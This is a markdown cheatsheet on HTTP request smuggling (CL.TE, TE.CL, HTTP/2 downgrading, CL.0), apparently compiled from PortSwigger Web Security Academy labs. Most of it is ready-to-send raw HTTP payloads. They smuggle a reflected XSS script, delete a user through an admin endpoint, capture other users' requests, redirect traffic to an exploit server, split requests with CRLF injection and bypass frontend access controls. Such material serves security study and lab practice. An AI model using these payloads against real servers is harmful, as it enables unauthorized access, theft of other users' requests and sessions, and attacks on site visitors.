---
title: Request Smuggling
description: Request Smuggling cheatsheet
---

# Request Smuggling

## Definition

**Request smuggling** is a type of cyber attack that exploits vulnerabilities in the way that web servers and other network components handle incoming requests. This attack involves sending multiple requests to a web server or other network component in a way that is intended to bypass security measures or to **interfere with the normal processing of the requests**. The goal of this attack is to gain unauthorized access to sensitive information or to perform other malicious actions.

## Potential impacts

- Capture request from other users
- Bypass frontend control
- Spread malicious response to users
    - XSS reflected
    - HTTP Redirection to vuln page

## CL.TE

Check if the vuln exists by looking for 404 response :

```
POST / HTTP/1.1
Host: 0a9000ba04ae672ec05a30930069004c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /404 HTTP/1.1
X-Ignore:
```

Reflected XSS via Smuggling :

```
POST / HTTP/1.1
Host: 0ac100440421efb2c002ce00008700bc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
Host: 0ac100440421efb2c002ce00008700bc.web-security-academy.net
User-Agent: M"><script>alert(1)</script>
X-Ignore:
```

To bypass duplicates error problem, the rest of the request will be in the params :

```
POST / HTTP/1.1
Host: 0a4000100459fd34c15c7dfe00be003a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Exfiltrate data using reflected HTTP params :

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

## TE.CL

> Use extension HTTP Request Smuggling

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

## HTTP/2 Downgrading

> Create & modify HTTP/2 request using Inspector.
> Shift + Enter to insert new line

Inject HOST based redirection response.

```
POST / HTTP/1.1
Host: 0ae700f90344dd30c0a54a7100b70046.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0a1500d60306ddd9c0be4a1d01ce00ad.exploit-server.net
Content-Length: 15

x=1
```

CRLF in request header / HTTP request splitting, to capture others request (HTTP2 downgrading will add \r\n\r\n at the end of the request) :

```
HTTP2 REQUEST
Foo: toto\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: 0a4600d80454afd4c0f201b000a200a4.web-security-academy.net
```

## CL.0

Find endpoint that is not supposed to handle POST requests like static files.

Send in single connection :

```
POST /resources/images/avatarDefault.svg HTTP/1.1
Host: 0a0600840320f8a1c184ace600510049.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 100

GET /admin HTTP/1.1
Foo: x
```

And another request on `GET /`, and voilà, you bypassed the frontend !

## References

- [PortSwigger - Request Smuggling](https://portswigger.net/web-security/request-smuggling)